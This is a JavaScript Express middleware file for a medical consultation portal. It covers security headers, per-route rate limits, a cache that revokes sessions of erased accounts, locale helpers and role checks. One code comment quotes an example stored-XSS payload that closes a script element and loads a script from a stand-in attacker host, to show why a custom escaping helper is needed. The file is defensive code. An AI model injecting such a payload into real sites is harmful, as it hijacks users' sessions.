const { addNonceMiddleware } = require('./middleware-nonce-fix');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');
const { rateLimit } = require('express-rate-limit');
const { verify } = require('./auth');
const { t: translate } = require('./i18n');
const { normalizeLang, getDir } = require('./utils/lang');
const fmt = require('./utils/formatNumber');
const moneyDisplay = require('./utils/money_display');
const dayjs = require('dayjs');
require('dotenv').config();

const SESSION_COOKIE = process.env.SESSION_COOKIE_NAME || 'tashkheesa_portal';

// ─────────────────────────────────────────────────────────────────────────────
// ERASED-ACCOUNT TOMBSTONES
//
// req.user is built from verify(token) with no database lookup — Phase 3
// FIX #12 removed the per-request query deliberately, to avoid thousands of
// pointless reads. That is the right call while accounts only ever appear.
// Erasure changes the arithmetic: the session cookie is a 7-day JWT
// (auth.js:40), so a patient who deletes their account on a laptop leaves a
// phone signed in for up to a week, and that session can still POST. With zero
// foreign keys onto users.id, nothing in the database would stop it creating
// an order whose patient_id names a user who no longer exists.
//
// So: one small query per instance per minute, not per request. The tombstone
// set is a handful of ids (migration 096 stores an id and a timestamp, nothing
// else), so it is read whole and cached. Worst case a stale session survives
// TTL_MS past the deletion instead of seven days.
//
// Fails OPEN on a database error. A tombstone lookup that cannot run must not
// log every patient out of the platform; the failure it guards is rare and
// bounded, and the failure it would cause is total.
// ─────────────────────────────────────────────────────────────────────────────
const TOMBSTONE_TTL_MS = 60 * 1000;
let _tombstones = new Set();
let _tombstonesAt = 0;
let _tombstonesInFlight = null;

function refreshTombstones() {
  if (_tombstonesInFlight) return _tombstonesInFlight;
  _tombstonesInFlight = (async () => {
    try {
      const { queryAll } = require('./pg');
      const rows = await queryAll('SELECT user_id FROM deleted_users', []);
      _tombstones = new Set(rows.map((r) => String(r.user_id)));
      _tombstonesAt = Date.now();
    } catch (_) {
      // Table missing (pre-096 environment) or database unreachable. Back off
      // for a full TTL rather than retrying on every request.
      _tombstonesAt = Date.now();
    } finally {
      _tombstonesInFlight = null;
    }
  })();
  return _tombstonesInFlight;
}

function isErasedUser(id) {
  if (!id) return false;
  if (Date.now() - _tombstonesAt > TOMBSTONE_TTL_MS) {
    // Kick a refresh but answer from the current set — never block a request
    // on it. A newly erased id is caught on the following request at worst.
    refreshTombstones();
  }
  return _tombstones.has(String(id));
}

function baseMiddlewares(app) {
  // Helmet — every header EXCEPT Content-Security-Policy.
  //
  // CSP is owned exclusively by the nonce middleware in src/server.js, which
  // calls res.setHeader('Content-Security-Policy', ...). setHeader REPLACES,
  // so helmet's policy never reached a browser: whichever ran last won, and
  // server.js always did. The directive block that used to live here was
  // therefore dead configuration that merely *looked* authoritative.
  //
  // It is deleted rather than left in place because it was actively dangerous
  // dead code:
  //   * script-src contained "'unsafe-inline'". If middleware order had ever
  //     shifted so helmet ran last, every inline <script> in the tree — and
  //     every injected one — would have executed, silently voiding the
  //     nonce-based policy the views are written against.
  //   * script-src also contained two PATH entries, '/js/availability-form.js'
  //     and '/js/booking-form.js'. CSP source expressions are scheme/host/port
  //     only; a leading-slash path is not a valid source and is ignored by
  //     browsers. Whoever added them believed they were allow-listing two
  //     files; they were allow-listing nothing.
  // The live directives (media-src blob:, worker-src blob:, form-action 'self')
  // have been carried over into the server.js array so nothing is lost.
  app.use(
    helmet({
      contentSecurityPolicy: false,
      // Avoid blocking third-party resources used by widgets/CDNs
      crossOriginEmbedderPolicy: false
    })
  );
  app.use(cookieParser());
  app.use(require('express').urlencoded({ extended: true, limit: '1mb' }));
  app.use(require('express').json({ limit: '1mb' }));

  // Rate limiter
  const limiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 100,
    validate: false,
    standardHeaders: true,
    legacyHeaders: false,
  });
  app.use(limiter);

  // Stricter rate limits for auth endpoints (brute-force protection)
  // Applies to both GET+POST on these paths (cheap + safe), but primarily protects POST attempts.
  const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 30, // per IP per window
    validate: false,
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many attempts. Please wait 15 minutes and try again.'
  });

  // Covers: /login, /forgot-password, /reset-password/:token
  app.use(['/login', '/forgot-password', '/reset-password'], authLimiter);

  // === PHASE 2: FIX #9 - RATE LIMITING FOR SENSITIVE ENDPOINTS ===
  // Rate limit file downloads to prevent bandwidth abuse
  const fileDownloadLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 50, // 50 downloads per minute per IP
    validate: false,
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many download requests. Please wait a moment and try again.',
    skip: (req) => {
      // Skip rate limiting for health checks and assets
      const p = req.path || '';
      return p.startsWith('/health') || p.startsWith('/public') || p.startsWith('/assets');
    }
  });
  app.use('/files', fileDownloadLimiter);

  // Rate limit internal/admin endpoints to prevent DoS
  const internalLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 10, // 10 requests per minute per IP
    validate: false,
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many requests to internal endpoints. Please try again later.'
  });
  app.use('/internal', internalLimiter);
  app.use('/verify', internalLimiter);

  // Case-submission rate limiting lives on the submit verb (POST
  // /patient/new-case/step5) in routes/patient.js, keyed per authenticated
  // patient — NOT here as a per-IP prefix limiter. The old prefix+IP limiter
  // locked out shared-NAT patients (one hospital/clinic/carrier IP = one
  // counter) and throttled ordinary wizard browsing/editing, not just submits.

  // Rate limit payment callbacks — Paymob fires one webhook per payment; cap at 20/min per IP
  const paymentCallbackLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 20,
    validate: false,
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many payment callback requests.'
  });
  app.use('/callback', paymentCallbackLimiter);
  app.use('/portal/video/payment/callback', paymentCallbackLimiter);

  // Rate limit referral endpoints — prevents brute-force code enumeration (10/min per IP)
  const referralLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 10,
    validate: false,
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many referral requests. Please wait a moment and try again.'
  });
  app.use('/api/referral', referralLimiter);

  // P1-A FIX: Rate limit doctor signup and pre-launch interest (no limit existed before)
  app.use('/doctor/signup', authLimiter);
  // AUDIT-P0-8: /register was covered only by the global 100/min limiter while
  // every other credential endpoint (/login, /forgot-password, /reset-password,
  // /doctor/signup) sat behind authLimiter. Each registration runs a cost-10
  // bcrypt hash (~100ms), so 100/min/IP was both an account-spam vector and a
  // CPU-exhaustion vector against a single-process Node server.
  app.use('/register', authLimiter);
  app.use('/api/pre-launch-interest', rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 10,
    validate: false,
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many submissions. Please wait 15 minutes and try again.'
  }));

  // Public website intake (marketing landing page → /api/cases/intake).
  // CSRF-exempt at src/middleware/csrf.js because the caller is cross-origin
  // and cannot read the httpOnly csrf_token cookie. Rate-limit-then-fail-closed
  // is the abuse defense. Per OQ-1 the HMAC option is deferred — revisit when
  // a third-party caller is exposed.
  app.use('/api/cases', rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 10,
    validate: false,
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many case submissions. Please wait 15 minutes and try again.'
  }));

  // App waitlist — 10 submissions per IP per hour
  app.use('/app/waitlist', rateLimit({
    windowMs: 60 * 60 * 1000,
    max: 10,
    validate: false,
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many waitlist submissions. Please try again later.'
  }));

  // Attach user + language to locals
  app.use((req, res, next) => {
    const token = req.cookies[SESSION_COOKIE];
    let user = null;

    if (token) user = verify(token);
    req.user = user || null;

    // === PHASE 3: FIX #11 - USE CENTRALIZED LANGUAGE NORMALIZATION ===
    // Priority: explicit ?lang= > session > cookie > default
    const lang = normalizeLang(
      (req.query && req.query.lang) ||
      (req.session && req.session.lang) ||
      (req.cookies && req.cookies.lang) ||
      'en'
    );

    // Keep session in sync if sessions are enabled
    if (req.session) req.session.lang = lang;

    // Persist ?lang= query param as cookie so it sticks across pages
    if (req.query && req.query.lang) {
      res.cookie('lang', lang, { maxAge: 365 * 24 * 60 * 60 * 1000, httpOnly: false });
    }

    res.locals.lang = lang;
    res.locals.dir = getDir(lang);
    res.locals.user = user;
    res.locals.brand = process.env.BRAND_NAME || 'Tashkheesa';
    res.locals.formatEventDate = (iso) => {
      if (!iso) return '';
      const d = dayjs(iso);
      if (!d.isValid()) return '';
      return d.format('DD/MM/YYYY — hh:mm A');
    };
    // Theme 10b Sub-issue C — locale-aware helpers (OQ-2 hybrid policy).
    res.locals.formatNumber   = (n, opts)           => fmt.formatNumber(n, lang, opts);
    res.locals.formatMoney    = (amount, currency)  => fmt.formatMoney(amount, currency, lang);
    res.locals.formatDate     = (iso, opts)         => fmt.formatDate(iso, lang, opts);
    res.locals.formatDateTime = (iso, opts)         => fmt.formatDateTime(iso, lang, opts);
    res.locals.t = (key) => translate(key, lang);
    // XSS-safe serialiser for embedding a value inside an inline <script>.
    //
    // `<%- JSON.stringify(v) %>` is NOT safe there. JSON.stringify does not
    // escape '<', so a value containing the literal text "</script>" closes the
    // enclosing script element from inside a JS string literal, and everything
    // after it is parsed as fresh HTML by the tokenizer. A stored value of
    //   </script><script src="https://evil.example/x.js"></script>
    // becomes a live external script tag with the viewer's session.
    //
    // Rewriting '<' and '>' to their backslash-u003c / backslash-u003e escapes
    // leaves the parsed
    // JS string value byte-for-byte identical, but the HTML tokenizer never
    // sees a '<' and so can never find a tag. '&' is escaped too so the output
    // is also correct if it ever lands in an HTML-escaping context, and
    // U+2028/U+2029 because JSON permits them raw while (pre-ES2019) JS treats
    // them as line terminators inside string literals.
    res.locals.jsonForScript = (v) =>
      JSON.stringify(v === undefined ? null : v)
        .replace(/</g, '\\u003c')
        .replace(/>/g, '\\u003e')
        .replace(/&/g, '\\u0026')
        .replace(/\u2028/g, '\\u2028')
        .replace(/\u2029/g, '\\u2029');
    // Always-charge-EGP local-price display helpers (read-only over the stored
    // EGP charge; NEVER change orders.price/currency). See utils/money_display.js.
    res.locals.isIntlOrder      = (order)  => moneyDisplay.isIntlOrder(order);
    res.locals.primaryPrice     = (order)  => moneyDisplay.primaryPrice(order);
    res.locals.chargeDisclosure = (order)  => moneyDisplay.chargeDisclosure(order, lang);

    // Canonical translation helper: tt(key, enFallback, arFallback).
    // Single source of truth per Theme 10 §4.B. Lookup order:
    //   1. If `key` resolves in src/i18n.js catalog for the active locale,
    //      return the catalog value.
    //   2. Otherwise return `enFallback` (EN mode) or `arFallback` (AR mode).
    //   3. If both fallbacks are missing, return the trimmed key, then ''.
    // Contract: never throws, never returns undefined.
    //
    // NOTE on legacy 2-arg call sites (`tt(enText, arText)`): these predate
    // the canonical signature. They render the same way as the prior fallback
    // implementation in server.js (preserved verbatim here). They are
    // tracked as Phase 2 migration debt in
    // docs/audits/THEME_10_VIEW_INVENTORY.md.
    res.locals.tt = function (key, enFallback, arFallback) {
      const isAr = lang === 'ar';
      // Trim at the entry point: src/i18n.js#t also trims keys before lookup,
      // so without this, a key with edge whitespace (common when migration
      // promotes an EN string to a key) would catalog-miss and i18n.t() would
      // return the *trimmed* key — which differs from `k` and would be
      // mistakenly treated as a catalog hit, returning the EN string in AR
      // mode. Trimming `k` here keeps the comparison consistent.
      const k = (typeof key === 'string') ? key.trim() : '';
      if (k) {
        const fromCatalog = translate(k, lang);
        if (fromCatalog && fromCatalog !== k) return fromCatalog;
      }
      if (isAr) return arFallback || enFallback || k || '';
      return enFallback || k || '';
    };

    next();
  });
}

function requireAuth() {
  return (req, res, next) => {
    if (req.user) return next();
    const nextUrl = encodeURIComponent(req.originalUrl || req.url || '/');
    return res.redirect(`/login?next=${nextUrl}`);
  };
}

// Backwards compatible:
// - requireRole('patient') works
// - requireRole('admin','superadmin') works
// - requireRole(['admin','superadmin']) works
function requireRole(...roles) {
  // Flatten + normalize
  const allowed = roles
    .flat()
    .filter(Boolean)
    .map((r) => String(r).toLowerCase());

  return (req, res, next) => {
    if (!req.user) {
      const nextUrl = encodeURIComponent(req.originalUrl || req.url || '/');
      return res.redirect(`/login?next=${nextUrl}`);
    }

    // A signed token for an account that has been erased is not a session.
    if (isErasedUser(req.user.id)) {
      res.clearCookie(SESSION_COOKIE, { path: '/' });
      return res.redirect('/account-deleted');
    }

    if (allowed.length === 0) return next();

    const role = String(req.user.role || '').toLowerCase();
    if (!allowed.includes(role)) {
      return res.status(403).type('text/plain').send('Forbidden');
    }

    // === PHASE 3: FIX #12 - MOVED PASSWORD CHECK TO LOGIN ONLY ===
    // Removed per-request DB query for patient password_hash check.
    // This check now happens only in auth.js login flow (not on every request).
    // If a patient somehow gets a token without a password, the /set-password
    // route will catch them. Eliminates 1000s of unnecessary DB queries.

    return next();
  };
}

module.exports = {
  baseMiddlewares,
  requireAuth,
  requireRole,
  // Exported for tests and for the deletion path, which primes the cache so
  // the erasing browser is not the one request that slips through.
  isErasedUser,
  refreshTombstones
};
